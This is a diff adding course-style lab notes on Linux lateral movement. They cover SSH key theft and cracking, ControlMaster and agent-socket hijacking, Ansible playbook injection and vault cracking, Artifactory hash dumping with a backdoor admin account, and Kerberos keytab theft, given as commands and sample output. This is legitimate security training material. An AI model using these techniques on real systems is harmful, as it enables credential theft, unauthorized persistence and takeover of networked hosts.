@@ -4066,6 +4066,1154 @@ sudo cp /etc/passwd /tmp/testpasswd
 
 # Linux Lateral Movement
 
+## Lateral Movement with SSH
+
+Some systems require public key authentication to connect via SSH.
+
+- The public key is stored in the `~/.ssh/authorized_keys` file of the server the user is connecting to.
+
+- The private key is typically stored in the `~/.ssh/` directory on the system the user is connecting from.
+
+### SSH Keys
+
+Typically, a user's SSH key will have permissions set to **600**.
+
+In Linux, private keys are named `id_rsa` by default.
+
+Finding private keys on the system
+
+```bash
+find /home/ -name "id_rsa"
+```
+
+Find out if our key is protected with a passphrase
+
+```bash
+cat /home/linuxvictim/svuser.key 
+```
+
+```
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,351CBB3ECC54B554DD07029E2C377380
+```
+
+- The "Proc-Type" header: the key is encrypted.
+- The "DEK-Info" header: the encryption type is "AES-128-CBC".
+
+Inspecting the `/etc/passwd` file => no **svuser** account => it's not likely that the key is for this machine.
+
+Find machines that have been connected to recently
+
+```bash
+cat /home/linuxvictim/.ssh/known_hosts
+```
+
+The system has the **HashKnownHosts** setting enabled in `/etc/ssh/ssh_config`, => entries in the `known_hosts` file are hashed.
+
+Checking the user's `~/.bash_history` file
+
+```bash
+tail /home/linuxvictim/.bash_history
+```
+
+```bash
+ssh -i ./svuser.key svuser@controller
+```
+
+Crack the passphrase offline.
+
+```bash
+ssh2john svuser.key > svuser.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
+```
+
+Connect to the controller VM
+
+```bash
+ssh -i ./svuser.key svuser@controller
+```
+
+### SSH Persistence
+
+The `authorized_keys` file is a list of all of the public keys permitted to access the user's account on the current machine.
+
+=> Insert our public key into a user's `~/.ssh/authorized_keys` file.
+
+Copying public keys from a remote system with **ssh-copy-id** requires authentication.
+
+If we have write access, simply append a new line to `authorized_keys`.
+
+Note: Most Linux systems require **644** permissions on `authorized_keys`.
+
+Create an SSH keypair on our Kali VM.
+
+```bash
+ssh-keygen -t rsa
+```
+
+The default values for the file path is our `~/.ssh/` directory:
+
+- `id_rsa` for the private key
+
+- `id_rsa.pub` for the public key.
+
+```bash
+cat id_rsa.pub
+```
+
+Insert the public key into the linuxvictim user's `authorized_keys` file
+
+```bash
+echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
+```
+
+SSH from our Kali VM to the linuxvictim machine. If we don't specify an SSH private key to use, the SSH client will use the one in `~/.ssh/id_rsa`.
+
+```bash
+ssh linuxvictim@linuxvictim
+```
+
+### SSH Hijacking with ControlMaster
+
+SSH hijacking == The use of an existing SSH connection to gain access to another machine.
+
+2 of the most common methods use the **ControlMaster** feature or the **ssh-agent**.
+
+ControlMaster enables sharing of multiple SSH sessions over a single network connection.
+
+Enable for a given user by editing `~/.ssh/config` with elevated privileges or write access to the user's home folder.
+
+1. Logging in as the offsec user, simulating an attacker gaining shell access to that account.
+
+2. Create a ControlMaster configuration for the offsec user.
+
+3. Simulate a legitimate user logged in as offsec on the same machine connecting into a downstream server
+
+4. Hijack that connection.
+
+ControlMaster config entry for SSH `~/.ssh/config`
+
+```
+Host *
+        ControlPath ~/.ssh/controlmaster/%r@%h:%p
+        ControlMaster auto
+        ControlPersist 10m
+```
+
+- 1st line: The configuration is being set for all hosts (*). It is possible to configure ControlPath settings for a specific host.
+
+- **ControlPath**: The ControlMaster **socket file** should be placed in `~/.ssh/controlmaster/` with the name <remoteusername@<targethost>:<port>. Assumes that the specified `controlmaster` folder actually exists.
+
+- **ControlMaster**: Any new connections will attempt to use existing ControlMaster sockets when possible. When those are unavailable, it will start a new connection.
+
+- **ControlPersist** can either be set to "yes" or to a specified time. If it is set to "yes", the socket stays open indefinitely. In this case, the socket will remain open for 10 minutes after the last connection and then it will close.
+
+These ControlMaster settings can also be placed in `/etc/ssh/ssh_config` to configure ControlMaster at a **system-wide level**.
+
+The number of available concurrent connections for SSH defaults to 10 as set in the **MaxSessions** variable in `/etc/ssh/ssh_config`, but may vary on different systems.
+
+Set the correct permission on the ControlMaster config file.
+
+```bash
+chmod 644 ~/.ssh/config
+```
+
+Create the required `~/.ssh/controlmaster/` socket directory.
+
+```bash
+mkdir ~/.ssh/controlmaster
+```
+
+Simulate our victim connecting to a downstream server named linuxvictim
+
+Find a socket file in `~/.ssh/controlmaster/` called `offsec@linuxvictim:22`.
+
+```bash
+ls -al ~/.ssh/controlmaster/
+```
+
+Hijacking as the same user with an open socket without being required to enter a password.
+
+```bash
+ssh offsec@linuxvictim
+```
+
+From user **root**, hijack the open SSH socket using the `-S` parameter.
+
+```bash
+ls -al /home/offsec/.ssh/controlmaster
+
+ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
+```
+
+### SSH Hijacking Using SSH-Agent and SSH Agent Forwarding
+
+**SSH-Agent** keeps track of a user's private keys and allows them to be used without having to repeat their passphrases on every connection.
+
+**SSH agent forwarding** allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine.
+
+E.g., A user might need to ssh from an intermediate host into another network segment, which can't be directly accessed from the originating machine.
+
+Advantage:
+
+- Not requiring the private key to be stored on the intermediate server
+
+- The user does not need to enter their passphrase more than once.
+
+Attack scenario: A user connects to an intermediate server and then to a subsequent remote server using SSH agent forwarding.
+
+To use an SSH-Agent:
+
+1. An SSH keypair needs to be set up on the originating machine (our Kali VM) (with `ssh-keygen` + a passphrase)
+
+2. Have our public key installed on both the intermediate server and the destination server.
+
+E.g., the intermediate server will be the **controller** machine and the destination server will be **linuxvictim**.
+
+Copying our SSH keys to the servers
+
+```bash
+ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
+ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
+```
+
+Enabling agent forwarding
+
+On our Kali VM, `~/.ssh/config`
+
+```
+ForwardAgent yes
+```
+
+On the intermediate server, `/etc/ssh/sshd_config`
+
+```
+AllowAgentForwarding yes
+```
+
+This allows the intermediate server to forward key challenges back to the originating client's SSH agent.
+
+On our Kali VM, start SSH-Agent manually + add our keys to the SSH-Agent (To use the key that is in the default key location (`~/.ssh/id_rsa`), we don't need to specify any parameters. Alternatively, add the path to the key file we want to use immediately after the command.)
+
+```bash
+eval `ssh-agent`
+
+ssh-add
+```
+
+SSHing through an intermediate server
+
+Note: We'll need to type our private key passphrase for the first connection so that the SSH-Agent can keep track of it.
+
+On Kali
+
+```bash
+ssh offsec@controller
+```
+
+On controller
+
+```bash
+ssh offsec@linuxvictim
+```
+
+- With ControlMaster exploitation, we were restricted to connecting to downstream servers that the user had an existing open connection to.
+
+- With SSH agent forwarding, since the intermediate system acts as if we already have the user's SSH keys available, we can SSH to any downstream server the compromised user's private key has access to.
+
+If we don't want to be logged in as the user whose SSH session is currently open, e.g., to avoid adding artifacts to the logs related to that user.
+
+The SSH-Agent mechanism creates an open socket file on the intermediate server that can be accessed by users with elevated permissions. => Leverage the victim user's open socket directly.
+
+Find the user's open SSH-Agent socket.
+
+Get a list of SSH connections
+
+```bash
+ps aux | grep ssh
+```
+
+```
+root      8106  0.0  0.1  72300  3976 ?        Ss   09:20   0:00 /usr/sbin/sshd -D
+root      8249  0.0  0.1 107984  3944 ?        Ss   09:59   0:00 sshd: root@pts/2
+root     15147  0.0  0.3 107984  7192 ?        Ss   11:14   0:00 sshd: offsec [priv]
+offsec   15228  0.0  0.1 107984  3468 ?        S    11:14   0:00 sshd: offsec@pts/0
+root     16298  0.0  0.3 107984  7244 ?        Ss   11:31   0:00 sshd: offsec [priv]
+offsec   16380  0.0  0.1 107984  3336 ?        S    11:31   0:00 sshd: offsec@pts/1
+root     16391  0.0  0.3 107984  7276 ?        Ss   11:31   0:00 sshd: root@pts/3
+```
+
+Get the process ID (PID) values for the SSH processes.
+
+```bash
+pstree -p offsec | grep ssh
+```
+
+```
+sshd(15228)---bash(15229)---su(15241)---bash(15242)
+sshd(16380)---bash(16381)
+```
+
+Cat the contents of the PID's environment file and search for a variable called **SSH_AUTH_SOCK**. 
+This variable lets SSH-Agent know where its socket file is located.
+
+```bash
+cat /proc/16381/environ
+```
+
+```
+LANG=en_US.UTF-8USER=offsecLOGNAME=offsecHOME=/home/offsecPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesMAIL=/var/mail/offsecSHELL=/bin/bashSSH_CLIENT=192.168.119.120 49916 22SSH_CONNECTION=192.168.119.120 49916 192.168.120.40 22SSH_TTY=/dev/pts/1TERM=xterm-256colorXDG_SESSION_ID=29XDG_RUNTIME_DIR=/run/user/1000SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380
+```
+
+Found the SSH auth socket was located at `SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380`.
+
+As an elevated user, use the victim's SSH agent socket file as if it were our own.
+
+```bash
+SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l
+
+SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
+```
+
+## DevOps
+
+Devops applies to management of software builds, system changes, and infrastructure modifications.
+
+DevOps mechanisms' inherent purpose is reconfiguring systems, especially by means of elevated privileges.
+
+Puppet, Chef, Ansible
+
+### Introduction to Ansible
+
+Ansible is an infrastructure configuration engine that enables IT personnel to dynamically and automatically configure IT infrastructure and computing resources. It works through a "push" model where the Ansible controller connects to registered "nodes" and runs "modules" on them.
+
+**Ansible modules** are specialized **Python scripts** that are transported to the nodes by Ansible and then run to perform certain actions. E.g., Gathering data to configuring settings or running commands and applications. After the scripts are run, artifacts from running the scripts are deleted and any data gathered by the script is returned to the controller.
+
+For a machine to be set up as a **node** for an **Ansible controller**, it needs to be part of the Ansible inventory on the controller server, normally located at `/etc/ansible/hosts`. Servers in the inventory can be grouped so that certain actions can be performed on some groups but not others.
+
+For actions to be performed on the node, either the **password** for a user on the node needs to be stored on the controller, or the controller's Ansible account needs to be configured on the node using **SSH keys** (has the public key for the controller's Ansible administrator user set in its `authorized_keys` file). This allows the controller to connect to the node via SSH or other means and run the desired modules.
+
+Because the Ansible server needs elevated privileges to perform certain tasks on the end node, the user configured by Ansible typically has **root or sudo-level permissions**.
+
+=> Compromising the Ansible server or getting the private key for an Ansible configuration account could allow complete compromise of any nodes in the Ansible controller's inventory.
+
+Find the host inventory on the controller
+
+```bash
+cat /etc/ansible/hosts
+```
+
+```
+[victims]
+linuxvictim
+```
+
+It consists of only one host, the linuxvictim machine as part of a group called "victims".
+
+### Enumerating Ansible
+
+Checking for Ansible on the target
+
+```bash
+ansible
+```
+
+Some other indicators would be:
+
+- The existence of an `/etc/ansible` filepath, which contains Ansible configuration files, or
+
+- The presence of "ansible" related usernames in `/etc/passwd`.
+
+To identify whether a machine we're on is an Ansible node instead:
+
+- Examine the list of users in `/etc/passwd` for Ansible-related usernames.
+
+- Check for the list of home folders, which may give away whether a user account exists for performing Ansible actions.
+
+- Detect Ansible-related log messages in the system's syslog file.
+
+### Ad-hoc Commands
+
+Node actions can be initiated from an Ansible controller in 2 primary ways:
+
+1. Through ad-hoc commands, and
+
+2. Through the use of playbooks.
+
+Ad-hoc commands are shell commands to be run on all, or a subset, of machines in the Ansible inventory.
+
+Ran `whoami` on all members of the victims group
+
+```bash
+ansible victims -a "whoami"
+```
+
+To run a command as root or a different user, use the `--become` parameter. Without a value, this defaults to root, but we could specify a user if we want.
+
+```bash
+ansible victims -a "whoami" --become
+```
+
+### Ansible Playbooks
+
+Playbooks allow sets of tasks to be scripted so they can be run routinely at points in time. => useful for combining various setup tasks, e.g. adding user accounts and settings to a new server or updating large numbers of machines at once.
+
+Playbooks are written using the **YAML** markup language.
+
+E.g., A simple playbook `/opt/playbooks/getinfo.yml`
+
+```
+---
+- name: Get system info
+  hosts: all
+  gather_facts: true
+  tasks:
+    - name: Display info
+      debug:
+          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
+```
+
+- name: gives a name to the playbook being run,
+- hosts: specifies which hosts from the inventory this playbook should be run on. We can specify groups, individual hosts, or "all".
+- gather_facts: gather information, or "facts", about the machine in a JSON format. This process fills the {{ansible_hostname}} and {{ansible-distribution}} variables in our output.
+- tasks: specifies a new task to be performed, labeled with a name, i.e. a call to an Ansible module. We run the **debug** module and provide a parameter of msg with a message to display.
+
+Run the playbook
+
+```bash
+ansible-playbook getinfo.yml 
+```
+
+Playbooks can also include a **become: yes** line if we want the scripts to be run as **root** or we can include a username if we want to run as someone else.
+
+### Exploiting Playbooks for Ansible Credentials
+
+If we have root access or access to the Ansible administrator account on the Ansible controller, run ad-hoc commands or playbooks as the Ansible user on all nodes, typically with elevated or root access.
+
+If Ansible is set up to use SSH for authentication to nodes, steal the Ansible administrator user's private key from their home folder and log in to the nodes directly.
+
+Often the private keys used by Ansible do not contain passphrases as Ansible configuration is intended to be run in an automated fashion.
+
+If stored playbooks on the controller are in a world-readable location or we have access to the folder they're stored in, we can search for hardcoded credentials, e.g. SSH usernames and passwords. (**read access**)
+
+Hardcoded credentials are stored with the keyword **ansible_become_pass**.
+
+```
+---
+- name: Write a file as offsec
+  hosts: all
+  gather_facts: true
+  become: yes
+  become_user: offsec
+  vars:
+    ansible_become_pass: lab
+  tasks:
+    - copy:
+          content: "This is my offsec content"
+          dest: "/home/offsec/written_by_ansible.txt"
+          mode: 0644
+          owner: offsec
+          group: offsec
+```
+
+**Ansible Vault** allows for secure storage of credentials for use in playbooks. Ansible Vault allows the user to encrypt or decrypt files or strings using a password.
+
+E.g., A playbook with encrypted vault password string
+
+```
+ansible_become_pass: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          39363631613935326235383232616639613231303638653761666165336131313965663033313232
+          3736626166356263323964366533656633313230323964300a323838373031393362316534343863
+          36623435623638373636626237333163336263623737383532663763613534313134643730643532
+          3132313130313534300a383762366333303666363165383962356335383662643765313832663238
+          3036
+```
+
+The **!vault** keyword lets Ansible know that the value is vault-encrypted.
+
+Copy the section of the encrypted payload above starting with **$ANSIBLE_VAULT** into a text file `test.yml`.
+
+Converting our Ansible Vault encrypted string to a crackable format
+
+```bash
+ansible2john.py ./test.yml
+```
+
+```
+test.yml:$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28...
+```
+
+Copy the string returned after the initial filename and colon character into a new file `testhash.txt`.
+
+Crack the vault password using the `rockyou.txt` wordlist.
+
+```bash
+hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt
+```
+
+Copy the original encrypted vault string into a text file `pw.txt`
+
+```
+$ANSIBLE_VAULT;1.1;AES256
+3936363161393532623538323261663961323...
+```
+
+Pipe it to `ansible-vault decrypt`. Enter our vault password => original, unencrypted password stored in the playbook
+
+```bash
+cat /opt/playbooks/pw.txt | ansible-vault decrypt
+```
+
+Decrypting encrypted files is essentially the same process, since files are encrypted using the same encryption scheme.
+
+### Weak Permissions on Ansible Playbooks
+
+
+If the playbook files used on the controller have world-writable permissions or if we can find a way to write to them,  inject tasks that will then be run the next time the playbook is run. (**write access**)
+
+Modify the playbook by adding few tasks to it.
+
+```
+---
+- name: Get system info
+  hosts: all
+  gather_facts: true
+  become: yes
+  tasks:
+    - name: Display info
+      debug:
+          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
+
+    - name: Create a directory if it does not exist
+      file:
+        path: /root/.ssh
+        state: directory
+        mode: '0700'
+        owner: root
+        group: root
+
+    - name: Create authorized keys if it does not exist
+      file:
+        path: /root/.ssh/authorized_keys
+        state: touch
+        mode: '0600'
+        owner: root
+        group: root
+
+    - name: Update keys
+      lineinfile:
+        path: /root/.ssh/authorized_keys
+        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
+        insertbefore: EOF
+```
+
+Add the **become** value to ensure the playbook is run as root.
+
+1. Creates the `/root/.ssh` folder and sets the appropriate permissions on it.
+
+2. Creates the `authorized_keys` file and sets its permissions.
+
+3. Copies our Kali public key into the root user's `authorized_keys` file, appending it to the end if the file already exists.
+
+SSH to the machine from our Kali VM as root.
+
+```bash
+ssh root@linuxvictim
+```
+
+To run shell commands directly on the machine.
+
+```
+    - name: Run command
+      shell: touch /tmp/mycreatedfile.txt
+      async: 10
+      poll: 0
+```
+
+Typically, when an Ansible playbook is run, it "blocks" or waits for a response to report back to the controller.
+
+If we specify the **async** parameter with any timeout value, the command will run asynchronously. The timeout value is disregarded because the **poll** setting of 0 makes the async value irrelevant. This tells Ansible not to poll the process for results but just let it run on its own until the execution of the playbook is complete. The **shell** value specifies the shell command we want to run.
+
+### Sensitive Data Leakage via Ansible Modules
+
+Some modules leak data to `/var/log/syslog` in the form of module parameters.
+
+E.g., The shell Ansible module
+
+```
+---
+- name: Backup TPS reports
+  hosts: linuxvictim
+  gather_facts: true
+  become: yes
+  tasks:
+    - name: Run command
+      shell: mysql --user=root --password=hotdog123 --host=databaseserver --databases tpsreports --result-file=/root/reportsbackup
+      async: 10 
+      poll: 0
+```
+
+When the Ansible administrator runs the playbook on the node, it attempts to connect to the MySQL server and dump the database. However, the playbook will log the shell command to syslog by default. An exception to this is when the **no_log** option is set to true in the playbook.
+
+Find these sorts of leaked secrets.
+
+```bash
+cat /var/log/syslog
+```
+
+## Introduction to Artifactory
+
+Artifactory is a "binary repository manager" that stores software packages and other binaries.
+
+Apache Archiva, SonaType Nexus, CloudRepo, or Cloudsmith.
+
+For organizations to be able to control which versions of packages and applications are being used in software development or infrastructure configuration. This prevents developers from getting untrusted or unstable binaries directly from the Internet.
+
+Users with write access to Artifactory can place packages or binaries in the Artifactory server. End users or automated processes can have Artifactory configured as a package repository to be used in a normal installation process on Linux or can pull files directly from Artifactory when needed.
+
+Normally, Artifactory would be run on a production system as a service.  To conserve resources, we'll start and stop it as needed and run it as a daemon process only.
+
+The open-source version of Artifactory is installed on the  VM in the `/opt/jfrog` directory.
+
+Starting the Artifactory process as a daemon process
+
+```bash
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
+```
+
+Stop the service
+
+```bash
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
+```
+
+http://controller:8082/ (admin:password123)
+ 
+While the commercial version of Artifactory supports a variety of **repository types** (including Debian packages), the open-source version is limited. The version of Artifactory we're using only offers Gradle, Ivy, Maven, SBT, and Generic repository types.
+
+Gradle, Maven, and SBT are all software build systems or tools and Ivy is a dependency manager for software builds.
+
+The Generic repository is for generic binaries of a non-specified type, essentially a simple file store.
+
+Examine a generic repository called "generic-local" `Artifactory > Artifacts`
+ 
+The `Set Me Up` button gives information about how to use Curl to upload and download binaries to the repository.
+
+There is also a `Deploy` button that will let us upload files to the repository and specify the paths we want users to access to download them.
+ 
+Clicking on **generic-local** expands the tree where we find a "vi" artifact listed.
+
+If we click on it, we can inspect various statistics about the file, such as the download path, who it was deployed by, when it was created and last modified, and how many times it's been downloaded.
+ 
+
+### Artifactory Enumeration
+
+Determine whether an Artifactory repository is running on a target system.
+
+```bash
+ps aux | grep artifactory
+```
+
+Try accessing the server externally from a web browser at port **8081**, which is the default port for Artifactory's web interface.
+
+### Compromising Artifactory Backups
+
+Situation: We have root access to the server, but we do not have Artifactory credentials.
+
+1. It is difficult to identify the files we want because they are stored by their file hash.
+
+```bash
+ls -al /opt/jfrog/artifactory/var/data/artifactory/filestore/37
+```
+
+Artifact binaries stored by hash
+
+```
+...
+-rw-r----- 1 root root 2675336 Jun  9 11:18 37125c1c4847ee56d5aaa2651c825cc3c2c781c5
+```
+
+2. If we replace the binary on disk with something else and then log into Artifactory and retrieve it, the file is not changed in the repository => other mechanisms in place to maintain file integrity.
+
+Artifactory stores its user information, such as usernames and encrypted passwords, in databases. The database depends on the configuration and version of Artifactory.
+
+Larger organizations with a commercial version of Artifactory may use **Postgres** databases. The open-source version of Artifactory defaults to an included **Apache Derby** database.
+
+2 options to use the database to compromise Artifactory.
+
+1. Through **backups**. Depending on the configuration, Artifactory creates backups of its databases. The open-source version of Artifactory creates database backups for the user accounts at `/<ARTIFACTORY FOLDER>/var/backup/access` in JSON format.
+
+Inspect the user entries by reading the contents of a database backup file
+
+```bash
+cat /opt/jfrog/artifactory/var/backup/access/access.backup.20200730120454.json
+```
+
+```
+...
+{
+    "username" : "developer",
+    "firstName" : null,
+    "lastName" : null,
+    "email" : "developer@corp.local",
+    "realm" : "internal",
+    "status" : "enabled",
+    "lastLoginTime" : 0,
+    "lastLoginIp" : null,
+    "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
+    "allowedIps" : [ "*" ],
+    "created" : 1591715957889,
+    "modified" : 1591715957889,
+    "failedLoginAttempts" : 0,
+    "statusLastModified" : 1591715957889,
+    "passwordLastModified" : 1591715957889,
+    "customData" : {
+      "updatable_profile" : {
+        "value" : "true",
+        "sensitive" : false
+      }
+...
+```
+
+These files have full entries for each user along with their passwords hashed in **bcrypt** format.
+
+Copy the bcrypt hashes, place them in a text file, and use John the Ripper (or Hashcat) to crack them.
+
+```bash
+sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+We retrieved the developer user's password.
+
+### Compromising Artifactory's Database
+
+If there are no backup files available, we can access the database itself or attempt to copy it and extract the hashes manually.
+
+The open-source version of Artifactory we're using locks its Derby database while the server is running.
+
+Remove the locks and access the database directly to inject users is risky and often leads to corrupted databases.
+
+=> Copy the entire database to a new location.
+
+3rd-party databases do not always have this restriction. If we can gain access to the database, it may be possible to create users manually by creating new records in the users table.
+
+The database containing the user information is located at `/opt/jfrog/artifactory/var/data/access/derby`.
+
+Create a temporary folder in `/tmp` for the database > copy the database from the original location > remove any lock files that exist from the database being in use when it was copied.
+
+```bash
+mkdir /tmp/hackeddb
+sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
+sudo chmod 755 /tmp/hackeddb/derby
+sudo rm /tmp/hackeddb/derby/*.lck
+```
+
+We'll need Apache's Derby tools to be able to connect to it. More specifically, the `ij` command line tool, which allows the user to access a Derby database and perform queries against it. (http://db.apache.org/derby/releases/release-10.15.1.3.html)
+
+Fortunately for us, the default database does not require a username and password and relies on file permissions to protect it. Because we have root privileges, we can connect without problems.
+
+Artifactory contains its own version of Java => use it to run the Derby connection utilities and connect to our database.
+
+```bash
+sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
+```
+
+```
+ij> connect 'jdbc:derby:/tmp/hackeddb/derby'; 
+```
+
+The utility uses SQL syntax commands to manipulate the database.
+
+List the users in the system.
+
+```
+ij> select * from access_users;
+```
+
+```
+USER_ID |USERNAME |PASSWORD |ALLOWED_IPS |CREATED |MODIFIED |FIRSTNAME |LASTNAME |EMAIL |REALM |STATUS |LAST_LOGIN_TIME |LAST_LOGIN_IP |FAILED_ATTEMPTS |STATUS_LAST_MODIFIED| PASSWORD_LAST_MODIF&
+...
+1 |admin |bcrypt$$2a$08$3gNs9Gm4wqY5ic/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2 |127.0.0.1 |1591715727140 |1591715811546 |NULL |NULL |NULL |internal |enabled |1596125074382 |192.168.118.5 |0 |1591715811545 |1591715811545       
+...    
+3 |developer |bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm |* |1591715957889 |1591715957889 |NULL |NULL |developer@corp.local |internal |enabled |0 |NULL |0 |1591715957889 |1591715957889       
+```
+
+Each record includes the bcrypt-hashed passwords of the users.
+
+### Adding a Secondary Artifactory Admin Account
+
+Gain access to Artifactory by adding a secondary administrator account through a built-in backdoor.
+
+If an administrator account is corrupted, or they lose access to the system, Artifactory offers an alternative option for gaining administrative access.
+
+Require restarting the Artifactory process => there is some risk of data corruption or production downtime. => not be an appropriate solution for all engagements.
+
+This method requires write access to the `/opt/jfrog/artifactory/var/etc/access` folder and the ability to change permissions on the newly-created file, which usually requires root or sudo access.
+
+Navigate to the `/opt/jfrog/artifactory/var/etc/access` folder > create a file through sudo called `bootstrap.creds` with the following content.
+
+```bash
+sudo nano bootstrap.creds
+```
+
+This will create a new user called "haxmin" with a password of "haxhaxhax".
+
+```
+haxmin@*=haxhaxhax
+```
+
+Changing the file permissions
+
+```bash
+sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
+```
+
+For this user to be created, restart the Artifactory process.
+
+```bash
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
+```
+
+During the restart stage, Artifactory will load our bootstrap credential file and process the new user.
+
+Verify this by examining the `/opt/jfrog/artifactory/var/log/console.log` file for the string "Create admin user".
+
+```bash
+sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
+```
+
+In a real-world scenario, if the user was using Artifactory as a repository, running an update on their local system would trigger a download of the updated binary.
+
+The next time the binary is run by the user, they would be compromised.
+
+## Kerberos on Linux
+
+Kerberos can also be used on Linux networks using Linux-specific Key Distribution Center servers. Alternatively, Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would.
+
+E.g., The linuxvictim lab machine is domain joined to `corp1.com`. Active Directory users can log in to the linuxvictim machine with their Active Directory credentials.
+
+To use Kerberos, the administrator can log in to the system using their AD credentials and then request Kerberos tickets.
+
+SSH connection to linuxvictim using AD credentials from our Kali VM.
+
+```bash
+ssh administrator@corp1.com@linuxvictim
+```
+
+Active Directory members using Kerberos authentication are assigned a **credential cache file** to contain their requested Kerberos tickets. The file's location is set through the user's **KRB5CCNAME** environment variable.
+
+Find the administrator's credential cache file
+
+```bash
+env | grep KRB5CCNAME
+```
+
+```
+KRB5CCNAME=FILE:/tmp/krb5cc_607000500_3aeIA5
+```
+
+Kerberos tickets expire after a period of time.
+
+To request a TGT, call `kinit` without parameters and enter the user's AD password.
+
+```bash
+kinit
+```
+
+List tickets currently stored in the user's credential cache file.
+
+```bash
+klist
+```
+
+```
+Ticket cache: FILE:/tmp/krb5cc_607000500_wSiMnP
+Default principal: Administrator@CORP1.COM
+
+Valid starting       Expires              Service principal
+05/18/2020 15:12:38  05/19/2020 01:12:38  krbtgt/CORP1.COM@CORP1.COM
+```
+
+To discard all cached tickets for the current user, use the `kdestroy` command without parameters.
+
+Get a list of available Service Principal Names (SPN) from the domain controller using Kerberos authentication (It may ask for an LDAP password, but if we just hit enter at the prompt, it will continue and use Kerberos for authentication)
+
+```bash
+ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
+```
+
+Request a service ticket from Kerberos for the MSSQL SPN
+
+```bash
+kvno MSSQLSvc/DC01.corp1.com:1433
+```
+
+Use `klist` again to confirm it was successful.
+
+```bash
+klist
+```
+
+```
+Ticket cache: FILE:/tmp/krb5cc_607000500_3aeIA5
+Default principal: Administrator@CORP1.COM
+
+Valid starting       Expires              Service principal
+07/30/2020 15:11:10  07/31/2020 01:11:10  krbtgt/CORP1.COM@CORP1.COM
+
+07/30/2020 15:11:41  07/31/2020 01:11:10  ldap/dc01.corp1.com@CORP1.COM
+
+07/30/2020 15:11:57  07/31/2020 01:11:10  MSSQLSvc/DC01.corp1.com:1433@CORP1.COM
+```
+
+We can now access the MSSQL service and perform authenticated actions.
+
+### Stealing Keytab Files
+
+One way to allow automated scripts to access Kerberos-enabled network resources on a user's behalf is through the use of keytab1 files. Keytab files contain a Kerberos principal name and encrypted keys. These allow a user or script to authenticate to Kerberos resources elsewhere on the network on the principal's behalf without entering a password.
+For example, let's assume a user wants to retrieve data from an MSSQL database via an automated script using Kerberos authentication.The user could create a keytab file for the script to authenticate against the server with their credentials and then retrieve the information on their behalf.
+
+Keytab files are commonly used in cron2 scripts when Kerberos authentication is needed to access certain resources. We can examine the contents of files like `/etc/crontab` to determine which scripts are being run and then examine those scripts to see whether they are using keytabs for authentication. Paths to keytab files used in these scripts may also reveal which users are associated with which keytabs.
+
+Let's create a sample demonstration keytab for our domain Administrator.
+
+We'll run the ktutil3 command, which provides us with an interactive prompt. Then we use addent to add an entry to the keytab file for the administrator user and specify the encryption type with -e. The utility asks for the user's password, which we provide. We then use wkt with a path to specify where the keytab file should be written. Finally, we can exit the utility with the quit command.
+
+```bash
+ktutil
+```
+
+```
+ktutil:  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
+Password for administrator@CORP1.COM: 
+
+ktutil:  wkt /tmp/administrator.keytab
+
+ktutil:  quit
+```
+
+Listing 67 - Creating a keytab file
+
+This will write the keytab file to `/tmp/administrator.keytab`.
+
+This keytab file grants domain administrator rights to scripts or users that have read access to it.
+However, let's imagine a scenario where we've gotten root access to this box. If we discover the keytab file, we can use it maliciously to gain access to other systems as the domain administrator. To use the file in a script run by the root user, we will use the following syntax.
+
+```bash
+root@linuxvictim:~# kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
+```
+
+Listing 68 - Loading a keytab file
+
+Using the klist command, we can verify that the tickets from the keytab have been loaded into our root account's credential cache file.
+
+```bash
+root@linuxvictim:~# klist
+```
+
+```
+Ticket cache: FILE:/tmp/krb5cc_1000
+Default principal: administrator@CORP1.COM
+
+Valid starting       Expires              Service principal
+07/30/2020 15:18:34  07/31/2020 01:18:34  krbtgt/CORP1.COM@CORP1.COM
+        renew until 08/06/2020 15:18:34
+```
+
+Listing 69 - Viewing our loaded TGT file from the keytab
+
